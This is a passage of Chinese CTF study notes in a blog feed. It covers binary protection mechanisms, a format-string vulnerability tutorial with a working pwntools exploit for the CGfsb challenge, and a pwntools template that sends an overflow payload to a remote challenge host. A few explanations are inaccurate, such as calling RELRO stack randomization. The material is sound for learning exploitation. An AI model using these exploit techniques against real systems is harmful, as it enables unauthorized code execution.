【10x10表示拼成横竖10张的图】</li></ul><h3 id="gaps"><a href="#gaps" class="headerlink" title="gaps"></a>gaps</h3><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/nemanja-m/gaps.git<span class="token builtin class-name">cd</span> gaps  pip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt  <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-tk  pip <span class="token function">install</span> <span class="token parameter variable">-e</span> <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件保护机制</title>
      <link href="/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/03/19/CTF%20-%20Pwn/%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="查看文件类型"><a href="#查看文件类型" class="headerlink" title="查看文件类型"></a>查看文件类型</h2><ul><li><code>file &lt;文件名&gt;</code><br><img src="https://s2.loli.net/2023/03/17/7lQIL4sMZbPWdxY.png" alt="CTF - Pwn_文件保护机制1.png"></li></ul><hr><h2 id="查看文件保护机制"><a href="#查看文件保护机制" class="headerlink" title="查看文件保护机制"></a>查看文件保护机制</h2><ul><li><strong>Kali：</strong><code>checksec &lt;文件名&gt;</code></li><li><strong>Ubuntu：</strong><code>checksec --file=&lt;文件名&gt;</code><br><img src="https://s2.loli.net/2023/03/17/kWEDwX8tOBRQCsZ.png" alt="CTF - Pwn_文件保护机制2.png"></li></ul><hr><ul><li><h3 id="Arch：程序架构信息"><a href="#Arch：程序架构信息" class="headerlink" title="Arch：程序架构信息"></a>Arch：程序架构信息</h3><ul><li>判断文件是 64位 还是 32位，exp 编写是 p64 还是 p32</li><li><code>p32()</code> 是对整数进行打包，转换成二进制的形式，比如转换成地址【<code>p64()</code> 处理后形成<strong>小端序</strong>字节码】<br><code>p32</code>、<code>p64</code> 是打包为二进制<br><code>u32</code>、<code>u64</code> 是解包为二进制</li><li><mark>32位</mark>：cpu 一次处理 32位 数据，即 4 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 4G，即有 $2^{32}$ 个地址，从 32个0 到 32个1 的地址<br><mark>64位</mark>：cpu 一次处理 64位 数据，即 8 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 128G，即 $2^{64}$ 个地址，从 64个0 到 64个1 的地址</li><li><strong>函数调用方式的区别</strong><ul><li><mark>32位</mark> 程序默认调用函数的方式<ol><li>将参数压入栈中</li><li>靠近 call 指令的是第一个参数</li><li>然后 call</li></ol></li><li><mark>64位</mark> 程序默认调用函数的方式<ol><li>RDI 中存放第1个参数</li><li>RSI 中存放第2个参数</li><li>RDX 中存放第3个参数</li><li>RCX 中存放第4个参数</li><li>R8 中存放第5个参数</li><li>R9 中存放第6个参数</li><li>如果还有更多的参数，再把过多那几个参数像32位程序一样压入栈中</li><li>然后call</li></ol></li></ul></li></ul></li></ul><hr><ul><li><h3 id="RELRO（Relocation-Read-Only，堆栈地址随机化）：用于加强对-binary-数据段的保护的技术"><a href="#RELRO（Relocation-Read-Only，堆栈地址随机化）：用于加强对-binary-数据段的保护的技术" class="headerlink" title="RELRO（Relocation Read-Only，堆栈地址随机化）：用于加强对 binary 数据段的保护的技术"></a>RELRO（Relocation Read-Only，堆栈地址随机化）：用于加强对 binary 数据段的保护的技术</h3><ol><li>主要针对 GOT 改写的攻击方式：<ul><li><strong>Partial RELRO（部分开启，GOT 可写）</strong>，易受到攻击，例如攻击者可以 atoi.got 为 system.plt，进而输入&#x2F;bin&#x2F;sh\x00获得shell</li><li><strong>Full RELRO（全部开启，GOT 不可写）</strong>，使整个 GOT 只读，从而无法被覆盖，意味着我们无法修改 GOT表。但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号</li></ul></li></ol></li></ul><hr><ul><li><h3 id="Stack（canary-金丝雀，一种用来防护栈溢出的保护机制）：栈溢出检查"><a href="#Stack（canary-金丝雀，一种用来防护栈溢出的保护机制）：栈溢出检查" class="headerlink" title="Stack（canary 金丝雀，一种用来防护栈溢出的保护机制）：栈溢出检查"></a>Stack（canary 金丝雀，一种用来防护栈溢出的保护机制）：栈溢出检查</h3><ol><li>Canary found 表示开启了 Canary 保护。不能直接用溢出的方法覆盖栈中返回地址</li><li>函数每一次执行时，在栈上随机产生一个Canary值【在函数的入口处，先从 fs&#x2F;gs 寄存器中取出一个4字节（eax）或者8字节（rax）的值存到栈上】，当函数结束时，会检查这个栈上的值是否和存进去的值一致</li><li>如果不合法，就会停止程序运行，作用相当于校验信息的 cookie</li><li>攻击者在覆盖返回地址的时候往往也会将 Canary 信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过</li></ol></li></ul><hr><ul><li><h3 id="NX（No-eXecute，栈不可执行）"><a href="#NX（No-eXecute，栈不可执行）" class="headerlink" title="NX（No-eXecute，栈不可执行）"></a>NX（No-eXecute，栈不可执行）</h3><ol><li>如果这个保护开启，就意味着栈中数据没有执行权限，程序将数据段和代码段分开了，因此不能将返回地址导向 shellcode 中</li><li>NX 基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令</li><li>如此一来，当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</li></ol></li></ul><hr><ul><li><h3 id="PIE（Position-Independent-Executable，位置无关可执行文件）"><a href="#PIE（Position-Independent-Executable，位置无关可执行文件）" class="headerlink" title="PIE（Position-Independent Executable，位置无关可执行文件）"></a>PIE（Position-Independent Executable，位置无关可执行文件）</h3><ol><li>PIE在编译时将程序编译为位置无关，程序运行的各个段加载的虚拟地址在装载时确定（地址随机化）</li></ol></li></ul><hr><ul><li><h3 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h3><ol><li>Linux 的权限不是很细致，只有RWX三种：<ul><li>**r (Read，读取)**：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限</li><li>**w (Write，写入)**：对文件而言，具有新增、修改、删除文件内容的权限；对目录来说，具有新建、删除、修改、移动目录内文件的权限</li><li>**x (eXecute，执行)**：对文件而言，具有执行文件的权限；对目录而言该用户具有进入目录的权限</li></ul></li><li>目录的只读访问不允许使用 <code>cd</code> 进入目录，必须要有执行的权限才能进入</li><li>只有执行权限只能进入目录，不能看到目录下的内容，要想看到目录下的文件名和目录名，需要可读权限</li><li>一个文件能不能被删除，主要看该文件所在的目录对用户是否具有写权限，如果目录对用户没有写权限，则该目录下的所有文件都不能被删除，文件所有者除外</li><li>目录的 <strong>w</strong> 位不设置，即使你拥有目录中某文件的 <strong>w</strong> 权限也不能写该文件</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/03/19/CTF%20-%20Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><blockquote><p>格式化字符串漏洞，是由编程时使用 <code>printf</code> 函数，在将数据格式化输出时产生的漏洞</p></blockquote><blockquote><p>其中 <code>*printf()</code> 函数包括 <code>printf</code>，<code>fprintf</code>，<code>sprintf</code>，<code>snprintf</code>，<code>vprintf</code>，<code>vfprintf</code>，<code>vsprintf</code>，<code>vsnprintf</code> 等函数，它们可以将数据格式化后输出</p></blockquote><blockquote><p>一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞</p></blockquote><hr><ul><li><p><strong>在pwn题中遇到格式化字符串漏洞时，我们一般会分两大步实现漏洞利用：</strong></p><ol><li>第一步构造一个payload，寻找输入字符串到栈顶指针的偏移</li><li>第二步就是攻击了，利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写</li></ol></li><li><p><strong>格式化输出说明符</strong><br><img src="https://s2.loli.net/2023/03/17/qwXZ6MnSIjRvDLK.png" alt="CTF - Pwn_格式化字符串漏洞1.png"></p><ol><li><code>%n</code> 是一个不常见的格式化字符串，可以将一个 <code>int</code> 型的值（4字节）写入指定的地址中，这将可以实现栈空间的随意改写</li><li>除了 <code>%n</code>，还有 <code>%hn</code>、<code>%hhn</code>、<code>%lln</code>，分别为写入目标空间 2字节、1字节、8字节，这里的字节对应的是参数的地址开始的几字节</li></ol></li></ul><hr><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><ul><li><p><code>printf()</code> 并不是一般的函数，它是C语言中少有的支持可变参数的库函数。所以，在被调用之前，被调用者无法知道函数调用之前有多少个参数被压入栈中。所以，<code>printf</code> 函数要求传入一个 <code>format</code> 参数以指定参数的数量和类型，然后 <code>printf</code> 函数就会严格的按照 <code>format</code> 参数所规定的格式逐个从栈中取出并输出参数</p></li><li><p><code>printf(&quot;%s %s %s %s %s\n&quot;, str1,str2,str3,str4,str5)</code></p><ol><li><strong>若 <code>printf</code> 函数中低于 6个 参数，则直接将值传给寄存器，按照参数的顺序，从左到右依次为 <code>edi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code></strong></li></ol></li><li><p><code>printf(&quot;%s %s %s %s %s %s %s %s %s %s %s\n&quot;, str1,str2,str3,str4,str5,str6,str7,str8,str9,str10,str11)</code></p><ol><li><strong>若 <code>printf</code> 函数中多于 6个 参数，从 第七个 参数才开始压栈</strong></li></ol></li></ul><hr><h3 id="关于-和-n"><a href="#关于-和-n" class="headerlink" title="关于 $ 和 %n"></a>关于 <code>$</code> 和 <code>%n</code></h3><blockquote><p><code>$</code> 号是用来指定参数的</p></blockquote><ul><li><strong><code>$n</code> 演示：</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"hello "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"world "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"I "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"am "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Tom "</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2$s %s %s %s %s %s\n"</span><span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span>str3<span class="token punctuation">,</span>str4<span class="token punctuation">,</span>str5 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>world hello world I am Tom</li></ul><blockquote><p>通过 <code>%n$p</code>，合理控制 <code>n</code> 就能获取栈中数据</p></blockquote><hr><ul><li><strong><code>%n</code> 演示：</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"111111"</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"222222"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%%48c%2$hhn \n"</span><span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c %c %c %c\n"</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>%48c<br>4 32 32 32</li></ul><hr><table><thead><tr><th align="left">目的</th><th align="left">实现</th></tr></thead><tbody><tr><td align="left">读取栈上某地址的大概格式</td><td align="left"><code>%%参数顺序$类型n</code>，譬如：<code>%7$lx</code>，就是以 <code>lx</code> 格式读 第7个 参数的值</td></tr><tr><td align="left">做写入的一般格式</td><td align="left"><code>%%数值c%参数顺序$类型</code>，譬如说：<code>%%40c%5$hhn</code>，就是向 第5个 参数写入 40 这个数值</td></tr></tbody></table><hr><ul><li><strong>如果给出的 <code>format</code> 参数的个数 &gt; 待输出的参数数量</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %d %d %d %d %x %x"</span><span class="token punctuation">,</span><span class="token string">"num"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>1 2 3 33 test 1a1390 4013e8</li></ul><blockquote><p>虽然给了 7个 格式化输出的参数，但是实际压入栈中的参数只有 5个，所以，<code>printf</code> 会输出两个本不应该输出的地址内容，借助这个漏洞，我们就泄露出了栈中的数据</p></blockquote><hr><h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><h3 id="泄露任意地址内容"><a href="#泄露任意地址内容" class="headerlink" title="泄露任意地址内容"></a>泄露任意地址内容</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leave your message please:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"your message is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> pwnme <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you pwned me, here is your flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thank you!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>看到第7行，<code>printf</code> 输出了在前面输入的 <code>v8</code> 变量，但是并没有给出任何格式化参数，所以我们可以通过构造 <code>v8</code> 的值来让 <code>printf</code> 误以为程序给出了格式化参数，从而乖乖的按照我们的意思输出我们所需的值</p></blockquote><ul><li>输出：<br><em>please tell me your name:</em><br><code>aaaa</code><br><em>leave your message please:</em><br><code>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</code><br><em>hello aaaa</em><br><em>your message is:</em><br><code>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025</code><br><em>Thank you!</em></li></ul><blockquote><p>显然，程序泄露出了我们想要知道的 <code>printf</code> 函数的栈帧中输出字符串后 19个 内存单元的值，理论上来说，我们可以使用这个漏洞来进行任意读取栈中的值</p></blockquote><hr><h3 id="修改任意地址值"><a href="#修改任意地址值" class="headerlink" title="修改任意地址值"></a>修改任意地址值</h3><blockquote><p>任意地址写就要用到上面说的 <code>%n</code> 了</p></blockquote><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the usage of %n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c = %d\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>输出：<br>c &#x3D; 13</li></ul><blockquote><p>就是说，**<code>%n</code> 参数把他前面输出的字符数赋值给了变量 <code>c</code>**，因此，只要更改 <code>c</code> 所对应栈中的地址就可以把我们想要的数值赋给对应地址</p></blockquote><hr><h3 id="printf栈结构"><a href="#printf栈结构" class="headerlink" title="printf栈结构"></a>printf栈结构</h3><p><img src="https://s2.loli.net/2023/03/17/Gb6ugVmROpPU1or.png" alt="CTF - Pwn_格式化字符串漏洞2.png"></p><ul><li>我们把先前输出字符的总长度赋值给了 参数4 所对应的地址，也就是说，我们只要控制前面输出的长度就可以控制该参数所对应地址的值了</li><li>要想控制 参数4 的值，就要用到 <code>printf</code> 的另外一个特性：<code>$</code> 操作符。这个操作符可以输出指定位置的参数</li><li>假如格式化输出参数是 <code>%6$n</code> 的话，就把之前输出的长度赋值给 <code>printf</code> 函数的 第6个 参数，但是 <code>printf</code> 函数根本不知道自己的栈有多大，所以我们只需要把这个偏移数值定位到我们能够修改的内存空间<ol><li>例如，把这个偏移数值定位到题目中的 v8 变量所在地址</li><li>获取偏移量，通过查看前面构造的偷看任意位置内存空间的输入运行结果：<br><code>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 (nil) 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025</code></li><li>看到 <code>&#39;0x41414141&#39;</code>，就是我们输入的 <code>AAAA</code>，也就是说，我们能控制的内存空间相对位置在 <code>printf</code> 函数的 第10个 参数位置<ul><li>其实 <code>printf</code> 函数根本没有这么多个参数，只不过他自己并不知道；从 <code>AAAA</code> 到 <code>0x41414141</code> 还有 九个 输出值，所以 <code>v8</code> 在相对 第10个 参数位置</li></ul></li></ol></li></ul><hr><ul><li><h3 id="构造-exp"><a href="#构造-exp" class="headerlink" title="构造 exp"></a>构造 exp</h3></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./CGfsb"</span><span class="token punctuation">)</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x0804A068</span> <span class="token comment">#pwnme地址在伪代码中双击查看</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'aaaa'</span> <span class="token operator">+</span> <span class="token string">'%10\$n'</span> <span class="token comment">#pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwntools</title>
      <link href="/2023/03/19/CTF%20-%20Pwn/Pwntools/"/>
      <url>/2023/03/19/CTF%20-%20Pwn/Pwntools/</url>
      
        <content type="html"><![CDATA[<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul><li><strong>exploit（简称exp）</strong>：用于攻击的脚本与方案</li><li><strong>payload</strong>：攻击载荷，是对目标进程劫持控制流的数据</li><li><strong>shellcode</strong>：调用攻击目标的 shell 的代码</li></ul><hr><h2 id="32位-和-64位-的差异"><a href="#32位-和-64位-的差异" class="headerlink" title="32位 和 64位 的差异"></a>32位 和 64位 的差异</h2><ul><li><strong>在写 exp、payload 的时候</strong></li></ul><table><thead><tr><th>位数</th><th>写法差异</th></tr></thead><tbody><tr><td>32位</td><td><code>p32(system) + p32(bin_sh)</code></td></tr><tr><td>64位</td><td><code>p64(rdi) + p64(bin_sh) + p64(system)</code></td></tr></tbody></table><ul><li>出现栈劫持的时候 <code>p(bin_sh)</code> 在前面</li></ul><hr><h2 id="Pwn程序输入脚本样例（exp-py）"><a href="#Pwn程序输入脚本样例（exp-py）" class="headerlink" title="Pwn程序输入脚本样例（exp.py）"></a>Pwn程序输入脚本样例（exp.py）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./when"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"220.249.52.133"</span><span class="token punctuation">,</span> <span class="token number">37645</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>  <span class="token comment"># 需要上传的输入内容，(0x20 - 0x18 + 8)根据栈地址确定需要输入的数据位数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"999"</span><span class="token punctuation">)</span>  <span class="token comment"># 给程序发送输入内容</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?\n"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序的输出信息</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 给程序发送payload作为输入内容</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>如果 exp.py 可以 PWN 通，在远程只会显示 <code>[*] Switching to interactive mode</code>，而没有 <code>[*] Got EOF while reading in interactive</code></strong></li></ul><hr><h2 id="exp-脚本直接获取-elf-文件中某个已知函数名的函数地址"><a href="#exp-脚本直接获取-elf-文件中某个已知函数名的函数地址" class="headerlink" title="exp 脚本直接获取 elf 文件中某个已知函数名的函数地址"></a>exp 脚本直接获取 elf 文件中某个已知函数名的函数地址</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序路径</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"callsystem"</span><span class="token punctuation">]</span>   <span class="token comment"># system_addr为程序test中函数"callsystem"的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="exp-脚本获取某一行的输出信息，并将其转换为-16进制-数据"><a href="#exp-脚本获取某一行的输出信息，并将其转换为-16进制-数据" class="headerlink" title="exp 脚本获取某一行的输出信息，并将其转换为 16进制 数据"></a>exp 脚本获取某一行的输出信息，并将其转换为 16进制 数据</h2><pre class="line-numbers language-python" data-language="python"><code 